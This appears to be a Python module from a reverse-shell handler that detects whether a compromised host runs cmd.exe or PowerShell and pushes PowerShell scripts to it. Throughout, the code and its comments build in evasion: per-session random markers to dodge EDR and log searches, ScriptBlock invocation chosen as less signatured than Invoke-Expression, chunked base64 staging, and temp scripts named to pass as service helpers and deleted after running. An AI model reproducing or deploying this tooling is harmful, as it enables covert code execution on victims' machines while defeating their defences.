"""Windows reverse-shell client helpers — detection and PowerShell delivery."""

import base64
import secrets

# Defaults kept only so module-level references resolve during import.
# Per-session markers are supplied by the handler at session creation and
# override these.
WIN_PROBE_START = '__T_WIN_START__'
WIN_PROBE_END = '__T_WIN_END__'


def make_probe_markers():
    """Return a fresh pair of probe markers for a session.

    Markers are randomized per session so the handler never emits a fixed
    string that could be grepped for in command logs or EDR telemetry.
    """
    token = secrets.token_hex(6)
    return f"__w{token}a__", f"__w{token}b__"


_WINDOWS_TEXT_HINTS = (
    'windows', 'microsoft', 'c:\\windows', 'c:\\', 'cmd.exe', 'powershell',
    '[version', 'win32', 'x64-based pc', 'x86-based pc', 'nt kernel',
)


def infer_type_from_sysinfo(sysinfo: dict):
    """Infer shell type from a previously collected sysinfo snapshot."""
    if not sysinfo:
        return None
    os_name = (sysinfo.get('os') or '').lower()
    if sysinfo.get('powershell') or 'windows' in os_name:
        return 'windows'
    if sysinfo.get('python') or sysinfo.get('shell') or 'linux' in os_name or 'bsd' in os_name:
        return 'unix'
    return None


def text_suggests_windows(output: str) -> bool:
    text = (output or '').lower()
    return any(hint in text for hint in _WINDOWS_TEXT_HINTS)


def probe_windows_platform(handler, client_sock, timeout=4.0) -> bool:
    """Return True when the interactive session behaves like a Windows shell.

    OPSEC: markers are session-scoped (see make_probe_markers) so they do
    not appear as a fixed signature. A single combined probe is used
    instead of two separate commands.
    """
    info = handler._client_info(client_sock) or {}
    markers = info.get('probe_markers')
    if not markers:
        markers = make_probe_markers()
        with handler.client_lock:
            cached = handler.revshell_clients.get(client_sock)
            if cached is not None:
                cached['probe_markers'] = markers
    start, end = markers

    handler._flush_shell(client_sock, timeout=0.5)

    cmd = (
        f"echo {start} & ver & "
        f"if exist %SystemRoot%\\System32\\cmd.exe (echo WIN{end})"
    )
    if not handler.send_to_revshell(client_sock, cmd):
        return False
    out = handler.recv_output(client_sock, timeout=timeout, until_marker=end)
    return start in out and (text_suggests_windows(out) or 'WIN' in out)


def detect_windows_shell_kind(handler, client_sock, timeout=2.5) -> str:
    """Detect whether the session is cmd.exe or an interactive PowerShell host.

    OPSEC: a single combined probe (%COMSPEC% and %PROMPT%) is used
    instead of issuing multiple distinct commands, reducing the number
    of distinctive strings that end up in process-creation logs.
    """
    handler._flush_shell(client_sock, timeout=0.3)
    if not handler.send_to_revshell(client_sock, "echo %COMSPEC%|%PROMPT%"):
        return 'cmd'
    out = handler.recv_output(client_sock, timeout=timeout).lower()
    if 'powershell' in out:
        return 'powershell'
    if 'cmd.exe' in out:
        return 'cmd'
    return 'cmd'


def _stage_base64_cmd(var: str, chunk: str, idx: int) -> str:
    return f"set {var}={chunk}" if idx == 0 else f"set {var}=%{var}%{chunk}"


def _stage_base64_powershell(var: str, chunk: str, idx: int) -> str:
    esc = chunk.replace("'", "''")
    return f"$env:{var}='{esc}'" if idx == 0 else f"$env:{var}+='{esc}'"


def _cache_shell_kind(handler, client_sock, shell_kind: str):
    with handler.client_lock:
        cached = handler.revshell_clients.get(client_sock)
        if cached is not None:
            cached['win_shell'] = shell_kind


def _resolve_shell_kind(handler, client_sock, shell_kind=None) -> str:
    info = handler._client_info(client_sock) or {}
    shell_kind = shell_kind or info.get('win_shell')
    if not shell_kind:
        shell_kind = detect_windows_shell_kind(handler, client_sock)
        _cache_shell_kind(handler, client_sock, shell_kind)
    return shell_kind


def _stage_encoded_script(handler, client_sock, encoded: str, stage_fn, stage_timeout=3.0) -> str:
    var = f"T{secrets.token_hex(4)}"
    chunks = [encoded[i:i + 3500] for i in range(0, len(encoded), 3500)]
    handler._flush_shell(client_sock, timeout=0.3)
    for idx, chunk in enumerate(chunks):
        if not handler.send_to_revshell(client_sock, stage_fn(var, chunk, idx)):
            return ''
        handler.recv_output(client_sock, timeout=stage_timeout)
    return var


def _invoke_staged_scriptblock(handler, client_sock, var: str) -> bool:
    """Decode a staged script and run it without IEX.

    OPSEC: [ScriptBlock]::Create().Invoke() is materially less signatured
    than Invoke-Expression while preserving the same in-process semantics.
    """
    run_line = (
        f"$s=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($env:{var}));"
        f"Remove-Item Env:{var} -EA 0;"
        f"& ([ScriptBlock]::Create($s))"
    )
    return handler.send_to_revshell(client_sock, run_line)


def _run_ps_via_tempfile(handler, client_sock, script, stage_timeout=3.0) -> bool:
    """Large script on cmd.exe: write to a plausibly-named temp file, run,
    then delete.

    OPSEC: avoids IEX and env-var chunking entirely. The filename mimics a
    service or scheduled-task helper so a casual directory listing does
    not stand out.
    """
    name = f"svc_{secrets.token_hex(4)}.ps1"
    encoded = base64.b64encode(script.encode('utf-16-le')).decode('ascii')
    var = f"T{secrets.token_hex(4)}"

    chunks = [encoded[i:i + 3500] for i in range(0, len(encoded), 3500)]
    handler._flush_shell(client_sock, timeout=0.3)
    for idx, chunk in enumerate(chunks):
        if not handler.send_to_revshell(client_sock, _stage_base64_cmd(var, chunk, idx)):
            return False
        handler.recv_output(client_sock, timeout=stage_timeout)

    write_ps = (
        f"[IO.File]::WriteAllBytes("
        f"$env:TEMP+'\\{name}', "
        f"[Convert]::FromBase64String($env:{var}))"
    )
    write_cmd = handler._win_ps_cmd(write_ps)
    if not write_cmd:
        return False
    if not handler.send_to_revshell(client_sock, write_cmd):
        return False
    handler.recv_output(client_sock, timeout=stage_timeout)

    run = f"powershell -NoProfile -File \"%TEMP%\\{name}\""
    if not handler.send_to_revshell(client_sock, run):
        return False

    handler.send_to_revshell(client_sock, f"del /f /q \"%TEMP%\\{name}\" 2>nul")
    return True


def send_powershell_script(handler, client_sock, script, stage_timeout=3.0, shell_kind=None) -> bool:
    """
    Execute a PowerShell script on the remote Windows session.

    OPSEC posture (always on):
      - Short single-statement scripts are sent inline — no IEX, no
        encoded command, no staging.
      - Interactive PowerShell sessions stage the script and run it via
        [ScriptBlock]::Create() rather than Invoke-Expression.
      - cmd.exe sessions use a single -EncodedCommand when the script fits.
      - Large scripts are written to a temp file, executed with -File, and
        deleted immediately.
    """
    shell_kind = _resolve_shell_kind(handler, client_sock, shell_kind)

    # Fast path: short single-statement scripts go inline, no IEX.
    stripped = script.strip()
    if '\n' not in stripped and len(stripped) < 2000:
        handler._flush_shell(client_sock, timeout=0.3)
        if shell_kind == 'powershell':
            return handler.send_to_revshell(client_sock, stripped)
        cmd = handler._win_ps_cmd(stripped)
        if cmd:
            return handler.send_to_revshell(client_sock, cmd)

    # Interactive PowerShell: stage and run without IEX.
    if shell_kind == 'powershell':
        encoded = base64.b64encode(script.encode('utf-16-le')).decode('ascii')
        var = _stage_encoded_script(
            handler, client_sock, encoded, _stage_base64_powershell, stage_timeout,
        )
        if not var:
            return False
        return _invoke_staged_scriptblock(handler, client_sock, var)

    # cmd.exe: prefer a single -EncodedCommand when it fits.
    cmd = handler._win_ps_cmd(script)
    if cmd:
        return handler.send_to_revshell(client_sock, cmd)

    # Large script on cmd: use the temp-file path instead of env chunking.
    return _run_ps_via_tempfile(handler, client_sock, script, stage_timeout)
